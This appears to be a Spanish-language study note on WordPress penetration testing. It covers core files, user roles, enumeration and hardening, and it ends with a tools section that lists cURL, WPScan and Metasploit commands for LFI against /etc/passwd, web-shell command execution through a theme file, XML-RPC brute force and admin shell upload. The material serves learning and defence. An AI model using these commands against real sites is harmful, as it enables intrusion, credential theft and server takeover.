# 00_Overview

**WordPress** es el Sistema de Gestión de Contenidos (**CMS**) de código abierto más popular del mundo, escrito en PHP y que generalmente utiliza MySQL como base de datos. Su popularidad y naturaleza extensible (temas y *plugins*) lo hacen un objetivo frecuente de ataques, principalmente a través de vulnerabilidades en *plugins* y temas de terceros, o por configuraciones incorrectas.

Un CMS facilita la construcción de sitios web sin necesidad de codificar todo desde cero, dividiéndose en la Aplicación de Gestión de Contenido (**CMA**) y la Aplicación de Entrega de Contenido (**CDA**).

Este módulo cubre la estructura central de WordPress, técnicas de enumeración manual y automatizada para descubrir *misconfigurations* y vulnerabilidades, y métodos comunes de explotación, incluyendo la obtención de ejecución de código remoto (RCE).

---

# Concepts

## 🏗️ Estructura y Archivos Clave de WordPress

La instalación por defecto de WordPress se basa en un *stack* LAMP (Linux, Apache, MySQL, PHP) y los archivos se encuentran típicamente en `/var/www/html`.

### Archivos y Directorios Esenciales:

| Archivo/Directorio | Descripción | Importancia en Seguridad |
| :--- | :--- | :--- |
| **`wp-config.php`** | Contiene la configuración de la BBDD (nombre, usuario, contraseña, *host*) y *Authentication Keys and Salts*. | La exposición de este archivo equivale a la exposición de credenciales de la BBDD. |
| **`wp-content/`** | Directorio principal para *plugins*, temas y archivos subidos (`uploads/`). | Debe enumerarse cuidadosamente en busca de datos sensibles o código vulnerable. |
| **`wp-admin/`** | Contiene el panel de administración y el *login*. | La ruta de *login* (`/wp-admin/login.php` o `/wp-login.php`) a veces se renombra para ofuscarla. |
| **`xmlrpc.php`** | Característica antigua para la transmisión de datos (reemplazada por la REST API). | Es un objetivo clave para ataques de *brute-force* de credenciales debido a su velocidad. |

## 👥 Roles de Usuario de WordPress

Existen cinco roles estándar que determinan los permisos y el acceso:

* **Administrator (Administrador):** Acceso total para añadir/eliminar usuarios y *posts*, y editar código fuente. El acceso *Administrator* es generalmente necesario para lograr RCE en el servidor.
* **Editor (Editor):** Puede publicar y gestionar *posts*, incluyendo los de otros usuarios.
* **Author (Autor):** Puede publicar y gestionar sus propios *posts*.
* **Contributor (Colaborador):** Puede escribir y gestionar sus propios *posts*, pero no publicarlos.
* **Subscriber (Suscriptor):** Usuarios normales que pueden navegar y editar su perfil.

## 🔎 Técnicas de Enumeración

### Enumeración de Versión Core (Pasiva)

La versión de WordPress se puede descubrir manualmente revisando el código fuente:

* **Meta Generator Tag:** `<meta name="generator" content="WordPress X.Y.Z" />`.
* **Archivos CSS/JS:** La versión a menudo se añade al final de las URLs de los archivos de estilo y *scripts* (ej. `?ver=5.3.3`).

### Enumeración de Usuarios

1.  **Método `/?author=<ID>` (Activa):**
    * Especificar el parámetro `author` en la URL (ej. `/?author=1`) provoca una redirección a la página de perfil si el ID existe (ej. `/author/admin/`), revelando el nombre de usuario.
    * Si el usuario no existe, se recibe un error `404 Not Found`.
2.  **Método JSON Endpoint (Pasiva/Activa):**
    * Consultar el *endpoint* `/wp-json/wp/v2/users` puede listar usuarios y sus IDs (versiones anteriores a 4.7.1 mostraban todos los usuarios que habían publicado).

### Indexación de Directorios (*Directory Indexing*)

Cuando la indexación de directorios está habilitada en el servidor web, un atacante puede navegar por carpetas no protegidas (ej. `/wp-content/plugins/mail-masta/`) y acceder a archivos sensibles o código fuente. Un *plugin* desactivado sigue siendo accesible a través del sistema de archivos, por lo que debe eliminarse o mantenerse actualizado.

## 🛡️ Hardening y Mejores Prácticas

La seguridad en WordPress se basa en la gestión de vulnerabilidades conocidas y la implementación de controles:

* **Actualizaciones Regulares:** Mantener el *core* de WordPress, *plugins* y temas constantemente actualizados es clave. Esto se puede automatizar en el archivo `wp-config.php`.
* **Gestión de *Plugins* y Temas:** Instalar solo componentes de fuentes confiables (WordPress.org), auditar y eliminar rutinariamente cualquier *plugin* o tema sin usar.
* **Seguridad Mejorada:** Usar *plugins* de seguridad como **Wordfence Security**, **Sucuri Security** o **iThemes Security** para proporcionar WAF, escaneo de *malware* y prevención de *brute-force*.
* **Gestión de Usuarios:**
    * Deshabilitar el usuario `admin` estándar.
    * Hacer cumplir contraseñas fuertes y 2FA (Two-Factor Authentication).
    * Restringir el acceso según el principio de *mínimo privilegio*.
* **Configuración:** Limitar los intentos de *login* y renombrar la página `wp-login.php`.

---

# Tools

## 🛠️ Herramientas Manuales (cURL)

| Herramienta | Comando / Sintaxis de Uso | Caso de Uso |
| :--- | :--- | :--- |
| **cURL (Versión)** | `curl -s -X GET http://target.com \| grep '<meta name="generator"'` | **Enumeración Pasiva:** Extrae la versión de WordPress del código fuente, buscando la etiqueta *meta generator*. |
| **cURL (Plugins)** | `curl -I -X GET http://target.com/wp-content/plugins/mail-masta` | **Enumeración Activa:** Envía una petición `GET` para verificar la existencia de un directorio de *plugin* (`HTTP/1.1 301 Moved Permanently` indica existencia, `404 Not Found` no). |
| **cURL (Usuarios - ID)** | `curl -s -I http://target.com/?author=1` | **Enumeración de Usuarios:** Confirma si un ID de autor existe y revela el nombre de usuario a través de la redirección (`Location` header). |
| **cURL (LFI)** | `curl http://target.com/wp-content/plugins/vulnerable/file.php?pl=/etc/passwd` | **Explotación de LFI:** Valida si un *plugin* es vulnerable a la Inclusión de Archivos Locales (LFI). |
| **cURL (RCE)** | `curl -X GET "http://target.com/wp-content/themes/<theme>/404.php?cmd=id"` | **Explotación de RCE (Web Shell):** Ejecuta un comando (`id`) a través de un *webshell* simple inyectado en un archivo de tema (ej. `404.php`). |
| **cURL (XML-RPC Brute)** | `curl -X POST -d "<methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>admin</value></param><param><value>password</value></param></params></methodCall>" http://target.com/xmlrpc.php` | **Ataque de Brute-Force:** Intento de *login* a través de `xmlrpc.php`. Una respuesta `403 faultCode` indica credenciales incorrectas. |

## 🤖 WPScan (Herramienta Automatizada)

**WPScan** es un escáner de WordPress automatizado y una herramienta de enumeración. Se utiliza para identificar si temas, *plugins* y el *core* están desactualizados o son vulnerables.

| Comando / Sintaxis de Uso | Caso de Uso |
| :--- | :--- |
| `wpscan --url http://target.com --enumerate` | **Escaneo de Enumeración Completa:** Enumera plugins, temas, usuarios, *backups* y vulnerabilidades conocidas. Puede incluir `--api-token` de WPVulnDB para mejor detección de vulnerabilidades. |
| `wpscan --enumerate ap` | **Enumeración Específica:** Enumera *todos* los *plugins* (`ap`).
| `wpscan --password-attack xmlrpc -U userlist.txt -P passwords.txt --url http://target.com` | **Brute-Force de Credenciales (XML-RPC):** Ataca la página `/xmlrpc.php` (método más rápido) con listas de usuarios y contraseñas.

## 💥 Metasploit (RCE Automatizado)

| Módulo | Comando / Sintaxis de Uso | Caso de Uso |
| :--- | :--- | :--- |
| **`exploit/unix/webapp/wp_admin_shell_upload`** | `use 0` (o el nombre completo) y `set` de opciones (RHOSTS, USERNAME, PASSWORD, LHOST). | **RCE y Reverse Shell:** Sube automáticamente un *payload* de *shell* al servidor web utilizando credenciales de administrador válidas. |
| **Explotación** | `run` | Ejecuta el módulo, intentando autenticar, subir el *payload* y obtener una sesión *Meterpreter*. |
